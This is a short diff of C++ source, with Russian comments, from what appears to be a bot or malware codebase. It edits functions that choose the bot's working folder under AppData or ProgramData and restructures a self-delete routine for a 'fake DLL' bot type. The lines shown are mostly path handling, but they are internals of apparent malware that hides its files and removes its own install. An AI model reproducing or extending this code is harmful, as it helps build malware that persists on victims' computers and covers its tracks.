@@ -317,34 +317,6 @@ PCHAR TBotApplication::GetWorkFolder()
 	return BOT_WORK_FOLDER_NAME;
 }
 //----------------------------------------------------------------------------
-/*
-string TBotApplication::MakeWorkPath(bool SystemPath)
-{
-	// Функция генерирует рабочий путь
-	string Result;
-
-	TMemory Path(MAX_PATH);
-	if (!pSHGetSpecialFolderPathA(NULL, Path.Buf(), CSIDL_APPDATA, TRUE))
-		return Result;
-
-	if (SystemPath)
-	{
-		// Получаем путь в системной папке
-		PCHAR Tmp = STRA::Scan(Path.AsStr(), ':');
-		if (Tmp == NULL) return Result;
-		Tmp++;
-		*Tmp = 0;
-	}
-
-	Result = Path.AsStr();
-	Result += "\\";
-	Result += GetWorkFolder();
-	Result += "\\";
-
-	return Result;
-}
-//----------------------------------------------------------------------------
-*/
 
 string TBotApplication::MakeWorkPath()
 {
@@ -653,14 +625,7 @@ string BOT::GetBotPath()
 	if (BotData->BotPath.IsEmpty())
 	{
 		// Создаём путь
-//		TMemory Path(MAX_PATH);
-//		if (pExpandEnvironmentStringsA("%AllUsersProfile%\\", Path.Buf(), MAX_PATH))
-//		{
-//			BotData->BotPath =  Path.AsStr();
-//        }
-
 		BotData->BotPath =  GetSpecialFolderPathA(CSIDL_COMMON_APPDATA, NULL);
-
 	}
 	return BotData->BotPath;
 }
@@ -1101,11 +1066,15 @@ void BOT::Delete()
 	bool deleted = false;
 	switch( BOT::GetBotType() )
 	{
-#ifdef BOTPLUG
+
 		case BotFakeDll:
-			deleted = FakeDllDelete();
-			break;
-#endif
+			{
+				#ifdef BOTPLUG
+					deleted = FakeDllDelete();
+				#endif
+				break;
+			}
+
 	}
 
 	if( !deleted )
